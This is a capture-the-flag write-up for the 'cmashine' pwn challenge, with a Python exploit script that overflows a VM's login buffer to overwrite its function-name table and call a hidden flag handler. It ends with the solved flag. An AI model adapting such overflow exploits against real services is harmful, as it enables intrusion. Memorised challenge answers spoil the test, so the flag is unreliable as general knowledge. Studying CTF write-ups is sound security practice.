# cmashine

## Challenge Overview
Name: cmashine
Author: @acez
Category: pwn
Description: Sometimes reversing is just blackbox pwning.
Flag format: midnight{...}
Objective: Exploit the Complex Machine VM to access the hidden flag handler.

## Files Provided
- N/A

## Solution Plan
1. Enumerate the VM commands and inspect the exposed memory/function table using `help`, `mem`, and `functions`.
2. Identify that function names are stored in VM memory starting at `0x100`, with the first slot pointing to `echo`.
3. Abuse the `login` command overflow by sending 256 bytes of padding followed by `flag\x00`, overwriting the first function-name slot from `echo` to `flag`.
4. Execute `call flag` to trigger the hidden flag handler and print the flag.

## Code (Exploit Script)
```bash
cat > solve_cmashine.py <<'PY'
#!/usr/bin/env python3
import socket
import time
import select
import re

HOST = "cmashine.play.ctf.se"
PORT = 9190

def recv_all(s, timeout=1.5):
    s.setblocking(False)
    out = b""
    end = time.time() + timeout
    while time.time() < end:
        try:
            r, _, _ = select.select([s], [], [], 0.05)
            if r:
                chunk = s.recv(8192)
                if not chunk:
                    break
                out += chunk
                end = time.time() + 0.25
        except Exception:
            break
    return out

def connect_retry():
    i = 0
    while True:
        i += 1
        try:
            s = socket.create_connection((HOST, PORT), timeout=0.7)
            print(f"[+] connected after {i} tries")
            return s
        except Exception:
            print(f"[-] offline try {i}")
            time.sleep(0.2)

# login writes up to 512 bytes into VM memory, while the user area is only 0x100 bytes.
# After 256 bytes, we overwrite the function-name table at mem[0x100].
# Replace the first function name, originally "echo", with "flag".
payload = b"login " + b"A" * 256 + b"flag" + b"\x00" * 16 + b"\n"
payload += b"call flag\n"

s = connect_retry()

try:
    banner = recv_all(s, 1.0)
    print(banner.decode(errors="replace"))

    print("[+] sending overflow payload...")
    s.sendall(payload)

    out = recv_all(s, 2.0)
    text = out.decode(errors="replace")
    print(text)

    m = re.search(r"midnight\{[^}]+\}", text)
    if m:
        print("[+] FLAG:", m.group(0))
    else:
        print("[!] flag not found in output")

finally:
    try:
        s.close()
    except Exception:
        pass
PY

python3 solve_cmashine.py
```

## Flag
```txt
midnight{700_b1G_f0r_th3_m4ch1ne}
```

## Notes
The important bug is that `login` copies the supplied password into VM memory with a 512-byte cap, but the normal user-controlled area is only `0x100` bytes. The function-name table begins at `mem[0x100]`, and `call` checks this table when dispatching functions. By overflowing into this table and replacing the first function name with `flag`, the hidden flag handler becomes callable through `call flag`.
